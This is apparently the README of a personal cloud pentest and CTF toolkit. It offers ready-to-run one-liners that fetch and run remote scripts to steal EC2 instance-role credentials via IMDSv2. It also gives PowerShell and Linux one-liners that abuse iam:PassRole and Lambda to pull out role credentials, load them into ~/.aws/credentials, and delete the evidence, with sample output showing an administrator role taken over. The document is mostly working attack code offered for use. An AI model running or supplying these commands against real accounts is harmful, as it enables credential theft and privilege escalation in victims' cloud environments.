# moratti-cloud-toolkit

This is a collection of scripts to help me on cloud CTFs and pentests. 


### EC2 IMDSv2 Credential Stealer one-liner

`wget https://raw.githubusercontent.com/lmoratti/moratti-cloud-toolkit/main/main.py && python main.py`

I designed this script to work with Amazon Linux 2 default python libraries. This means its unfortunately a Python2 script because by default Python3 on AL2 does not have the requests library imported. :(

There is a corresponding blog post on my medium blog here if you're interested:
https://medium.com/@morattisec

Example output:
```
 ********************************************************************** 

Attempting to exfiltrate EC2 instance role credentials.
   Attempting to PUT request to metadata endpoint to obtain token for subsequent requests.
        [SUCCESS]
   Enumerating role name for the EC2 instance profile.
        [SUCCESS]
   Making final request for credentials
        [SUCCESS]

These credentials expire after 6 hours. You can copy and paste this blob into ~/.aws/credentials to quickly make a profile from your host machine.

[AdministratorEc2]
aws_access_key_id = ASIAfakekeyhere
aws_secret_access_key = examplesecretkey
aws_session_token = actual_value_here

**One-liners to use on a different host to add this key as an AWS CLI profile **

 LINUX ONE-LINER:

echo -e "BIGBLOBOFBASE64HERE" | base64 -d >> ~/.aws/credentials 

 POWERSHELL ONE-LINER:

$ENCODED = "BIGBLOBOFBASE64HERE";$DECODED=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ENCODED));Add-Content $env:USERPROFILE\.aws\credentials $DECODED;$ENCODED="";$DECODED="";

Run this AWS CLI command to see if your profile works and if the name of the credentials is accurate.
aws --profile AdministratorEc2 sts get-caller-identity
```
### Lambda:Invoke and Steal Lambda Role Credentials
>"With access to the iam:PassRole, lambda:AddPermission, and lambda:CreateFunction permissions, an adversary can create a Lambda function with an existing role. This function could then by updated with lambda:AddPermission to allow another principal in another AWS account the permission to invoke it. It is worth noting that the AWS account must already contain a role that can be assumed by Lambda.
https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"

This one liner needs to be slightly modified to have you will need to edit $AWS_CLI_PROFILE_NAME and $ROLE_ARN

It will:
1. Pull down index.py code
2. Zip index.py code
3. Create a lambda function with the role and code 
4. Invoke that function that steals the credentials
5. Take the credentials and add them to your ~/.aws/credentials file
6. Delete index.py, index.zip, output.txt (lambda's output) files
7. Delete the function we create/invoked.
8. Call sts get-caller-identity with the newly configured "lambda-credentials-exfil"

Protip, you can press the "home" key the bring you the beginning of the command to edit ROLE_ARN and AWS_CLI_PROFILE_NAME.

Power shell one-liner:
```
$ROLE_ARN="arn:REPLACEME";$AWS_CLI_PROFILE_NAME="REPLACME";Invoke-WebRequest -Uri "https://raw.githubusercontent.com/lmoratti/moratti-cloud-toolkit/main/index.py" -OutFile "index.py";echo "using --profile $AWS_CLI_PROFILE_NAME for AWS CLI commands";echo "Role Arn is set to $ROLE_ARN";echo "zipping the index.py";Compress-Archive -LiteralPath .\index.py -DestinationPath .\index.zip -Force;echo "Creating a lambda function with $ROLE_ARN attached. You might need to press enter a few times if you have lots of functions to scroll through.";Start-Sleep -Seconds 5;aws --profile "$AWS_CLI_PROFILE_NAME" lambda create-function --function-name lambda-credentials --role $ROLE_ARN --zip-file fileb://.\index.zip  --handler index.lambda_handler --runtime python3.9;echo "Sleep for 10s. Press control + c if you got an error on create.";Start-Sleep -Seconds 5;echo "Invoking Function...";aws --profile "$AWS_CLI_PROFILE_NAME" lambda invoke --function-name lambda-credentials output.txt;echo "Adding the credentials to your ~/.aws/credentials file";$EncodedCreds=`Get-Content output.txt;$DecodedCreds=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($EncodedCreds));Add-Content $env:USERPROFILE\.aws\credentials "$DecodedCreds"; $DecodedCreds="";$EncodedCreds="";del output.txt;$ROLE_ARN="";echo "Check your ~/.aws/credentials file to ensure the profile was added and there's no duplicates.";echo "Deleting the lambda function";aws --profile $AWS_CLI_PROFILE_NAME lambda delete-function --function-name lambda-credentials;del index.py; del index.zip;$AWS_CLI_PROFILE_NAME="";aws --profile lambda-credentials-exfil sts get-caller-identity;

```

Linux one-liner
```
ROLE_ARN="arn:REPLACEME" && AWS_CLI_PROFILE_NAME="REPLACME" && wget https://raw.githubusercontent.com/lmoratti/moratti-cloud-toolkit/main/index.py && echo "using --profile $AWS_CLI_PROFILE_NAME for AWS CLI commands" && echo "Role Arn is set to $ROLE_ARN" && echo "Zipping the index.py" && zip -r index.zip index.py && echo "Creating a lambda function with $ROLE_ARN attached. You might need to press enter a few times if you have lots of functions to scroll through." && sleep 5 && aws --profile $AWS_CLI_PROFILE_NAME lambda create-function --function-name lambda-credentials --role $ROLE_ARN --zip-file fileb://index.zip  --handler index.lambda_handler --runtime python3.9 && echo "Sleep for 5s. Press control + c if you got an error on create." && sleep 5 && echo "Invoking Function..." && aws --profile "$AWS_CLI_PROFILE_NAME" lambda invoke --function-name lambda-credentials output.txt && echo "Adding the credentials to your ~/.aws/credentials file" && base64 -d output.txt >> ~/.aws/credentials && echo "Check your ~/.aws/credentials file to ensure the profile was added and there's no duplicates." && echo "Deleting the lambda function" && aws --profile $AWS_CLI_PROFILE_NAME lambda delete-function --function-name lambda-credentials && rm -rf index.py && rm -rf index.zip && rm -rf output.txt && ROLE_ARN="" && AWS_CLI_PROFILE_NAME="" && aws --profile lambda-credentials-exfil sts get-caller-identity 
```

Example Output:
```
--2022-11-27 18:28:53--  https://raw.githubusercontent.com/lmoratti/moratti-cloud-toolkit/main/index.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 881 [text/plain]
Saving to: ‘index.py’

index.py                  100%[=====================================>]     881  --.-KB/s    in 0s

2022-11-27 18:28:53 (112 MB/s) - ‘index.py’ saved [881/881]

--profile lizzie-personal
Role Arn is set to arn:aws:iam::FAKEACCTID:role/AdministratorEc2
Zipping the index.py
  adding: index.py (deflated 64%)
Creating a lambda function with arn:aws:iam::FAKEACCTID:role/AdministratorEc2 attached. You might need to press enter a few times if you have lots of functions to scroll through.
{
    "FunctionName": "lambda-credentials",
    "FunctionArn": "arn:aws:lambda:us-west-2:FAKEACCTID:function:lambda-credentials",
    "Runtime": "python3.9",
    "Role": "arn:aws:iam::FAKEACCTID1:role/AdministratorEc2",
    "Handler": "index.lambda_handler",
    "CodeSize": 485,
    "Description": "",
    "Timeout": 3,
    "MemorySize": 128,
    "LastModified": "2022-11-28T02:29:01.558+0000",
    "CodeSha256": "X5kiMLIR8KpVRQXIjnx7bScth5U=",
    "Version": "$LATEST",
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "f0e254b8-d0c65ff7275a",
    "State": "Pending",
    "StateReason": "The function is being created.",
    "StateReasonCode": "Creating",
    "PackageType": "Zip",
    "Architectures": [
        "x86_64"
    ],
    "EphemeralStorage": {
        "Size": 512
    }
}
Sleep for 5s. Press control + c if you got an error on create.
Invoking Function...
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
Adding the credentials to your ~/.aws/credentials file
Check your ~/.aws/credentials file to ensure the profile was added and there's no duplicates.
{
    "UserId": "AROAW4IVVFNJ3MEVMIRJT:lambda-credentials",
    "Account": "FAKEACCTID",
    "Arn": "arn:aws:sts::FAKEACCTID:assumed-role/AdministratorEc2/lambda-credentials"
}

```